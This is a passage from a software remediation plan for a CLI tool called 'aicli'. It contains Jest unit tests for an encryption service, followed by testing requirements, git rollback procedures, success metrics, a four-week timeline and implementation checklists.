        const plaintext = 'sensitive data';
        const encrypted = await securityService.encrypt(plaintext);

        // Format: iv:authTag:encryptedData
        const parts = encrypted.split(':');
        expect(parts).toHaveLength(3);
        expect(parts[0]).toHaveLength(32); // 16 bytes IV as hex
        expect(parts[1]).toHaveLength(32); // 16 bytes auth tag as hex
        expect(parts[2].length).toBeGreaterThan(0);
      });

      it('should generate different IVs for same plaintext', async () => {
        const plaintext = 'test data';
        const encrypted1 = await securityService.encrypt(plaintext);
        const encrypted2 = await securityService.encrypt(plaintext);

        expect(encrypted1).not.toBe(encrypted2);
      });

      it('should generate encryption key if not exists', async () => {
        mockKeytar.getPassword.mockResolvedValueOnce(null); // No key exists
        mockKeytar.setPassword.mockResolvedValue(undefined);

        await securityService.encrypt('test');

        expect(mockKeytar.setPassword).toHaveBeenCalledWith(
          'aicli',
          'session_encryption_key',
          expect.any(String)
        );
      });
    });

    describe('decrypt', () => {
      it('should decrypt encrypted text', async () => {
        const plaintext = 'my secret message';
        const encrypted = await securityService.encrypt(plaintext);
        const decrypted = await securityService.decrypt(encrypted);

        expect(decrypted).toBe(plaintext);
      });

      it('should throw error for invalid format', async () => {
        await expect(securityService.decrypt('invalid:format')).rejects.toThrow(
          'Invalid encrypted format'
        );
      });

      it('should throw error for tampered ciphertext', async () => {
        const plaintext = 'test';
        const encrypted = await securityService.encrypt(plaintext);

        // Tamper with the ciphertext
        const parts = encrypted.split(':');
        parts[2] = 'tampered';
        const tampered = parts.join(':');

        await expect(securityService.decrypt(tampered)).rejects.toThrow(
          'Decryption failed'
        );
      });

      it('should handle decryption with wrong key', async () => {
        const plaintext = 'secret';
        const encrypted = await securityService.encrypt(plaintext);

        // Change the key
        mockKeytar.getPassword.mockResolvedValue('1'.repeat(64));

        await expect(securityService.decrypt(encrypted)).rejects.toThrow(
          'Decryption failed'
        );
      });
    });

    describe('encrypt/decrypt round-trip', () => {
      it('should handle empty string', async () => {
        const encrypted = await securityService.encrypt('');
        const decrypted = await securityService.decrypt(encrypted);
        expect(decrypted).toBe('');
      });

      it('should handle unicode characters', async () => {
        const plaintext = '🔒 Encrypted: 你好世界 مرحبا';
        const encrypted = await securityService.encrypt(plaintext);
        const decrypted = await securityService.decrypt(encrypted);
        expect(decrypted).toBe(plaintext);
      });

      it('should handle large text', async () => {
        const plaintext = 'a'.repeat(10000);
        const encrypted = await securityService.encrypt(plaintext);
        const decrypted = await securityService.decrypt(encrypted);
        expect(decrypted).toBe(plaintext);
      });

      it('should handle JSON data', async () => {
        const jsonData = JSON.stringify({ user: 'test', session: 123, data: [1, 2, 3] });
        const encrypted = await securityService.encrypt(jsonData);
        const decrypted = await securityService.decrypt(encrypted);
        expect(JSON.parse(decrypted)).toEqual(JSON.parse(jsonData));
      });
    });
  });
});
```

Continue in next file for remaining tests...

### Testing Requirements

1. **Unit Tests:** 90%+ coverage for all services
2. **Integration Tests:** Critical paths tested end-to-end
3. **Coverage Reports:** HTML reports generated in `coverage/`
4. **CI Integration:** Tests must pass before merge

### Acceptance Criteria

- [ ] Overall coverage ≥ 70%
- [ ] ChatService coverage ≥ 80%
- [ ] SecurityService coverage ≥ 90%
- [ ] SessionService coverage ≥ 75%
- [ ] All tests pass
- [ ] Coverage report generated
- [ ] No flaky tests

---

## P1-002: Implement Structured Logging

### Priority: P1 (High)
### Estimated Effort: 6 hours
### Risk Level: LOW

See separate section in next document due to length...

[Document continues with remaining P1 items: Structured Logging, Decouple Services from UI, Add CI/CD Pipeline]

---

## Testing Strategy

### Unit Testing

- **Framework:** Jest with ts-jest
- **Coverage Goal:** 70%+ overall
- **Mocking:** All external dependencies mocked
- **Location:** `src/**/__tests__/*.test.ts`

### Integration Testing

- **Scope:** Multi-service workflows
- **Examples:**
  - Chat flow with tool execution
  - Session save/load with encryption
  - Provider fallback mechanism
- **Location:** `src/**/__tests__/*.integration.test.ts`

### Security Testing

- **Penetration Testing:** Command injection attempts
- **Vulnerability Scanning:** `npm audit`
- **Code Analysis:** ESLint security plugin

### Manual Testing

- [ ] Fresh installation on clean system
- [ ] All CLI commands work correctly
- [ ] Streaming responses function properly
- [ ] Sessions persist correctly
- [ ] API keys stored securely

---

## Rollback Procedures

### For Each P0/P1 Item

1. **Create Feature Branch**
   ```bash
   git checkout -b fix/p0-001-command-injection
   ```

2. **Implement with Commits**
   - Small, atomic commits
   - Clear commit messages
   - Reference issue numbers

3. **Tag Before Merge**
   ```bash
   git tag -a pre-p0-001 -m "Before command injection fix"
   ```

4. **If Issues Arise**
   ```bash
   git revert <commit-hash>
   # OR
   git reset --hard pre-p0-001
   ```

5. **Hotfix Process**
   - Revert problematic change
   - Create hotfix branch
   - Deploy fixed version
   - Post-mortem analysis

---

## Success Metrics

### Code Quality
- [ ] ESLint runs without errors
- [ ] TypeScript compiles without errors
- [ ] Test coverage ≥ 70%
- [ ] Zero high/critical npm audit issues

### Security
- [ ] Command injection vulnerability fixed
- [ ] All security tests pass
- [ ] Penetration testing clean
- [ ] Security documentation complete

### Performance
- [ ] Build time < 30 seconds
- [ ] Test suite runs in < 2 minutes
- [ ] No memory leaks detected
- [ ] Startup time < 1 second

### Developer Experience
- [ ] CI/CD pipeline operational
- [ ] Automated tests on PR
- [ ] Clear documentation
- [ ] Easy local setup

---

## Timeline

| Item | Priority | Effort | Week |
|------|----------|--------|------|
| P0-001: Command Injection Fix | P0 | 8h | Week 1 |
| P0-002: ESLint Config | P0 | 2h | Week 1 |
| P0-003: Install Dependencies | P0 | 1h | Week 1 |
| P1-001: Test Coverage (Part 1) | P1 | 24h | Week 2 |
| P1-002: Structured Logging | P1 | 6h | Week 2 |
| P1-001: Test Coverage (Part 2) | P1 | 16h | Week 3 |
| P1-003: Decouple Services | P1 | 8h | Week 3 |
| P1-004: CI/CD Pipeline | P1 | 6h | Week 4 |
| **Total** | | **71h** | **4 weeks** |

---

## Appendix A: Testing Checklist

### Pre-Implementation
- [ ] Review requirements
- [ ] Identify dependencies
- [ ] Create feature branch
- [ ] Write failing tests (TDD)

### Implementation
- [ ] Write code to pass tests
- [ ] Run linter
- [ ] Fix type errors
- [ ] Update documentation

### Post-Implementation
- [ ] All tests pass
- [ ] Coverage meets threshold
- [ ] Code review approved
- [ ] Manual testing complete
- [ ] Documentation updated
- [ ] Merge to main

### Deployment
- [ ] Build successful
- [ ] Tests pass in CI
- [ ] Security scan clean
- [ ] Deploy to staging
- [ ] Integration tests pass
- [ ] Deploy to production
- [ ] Monitor for issues

---

**Document End**
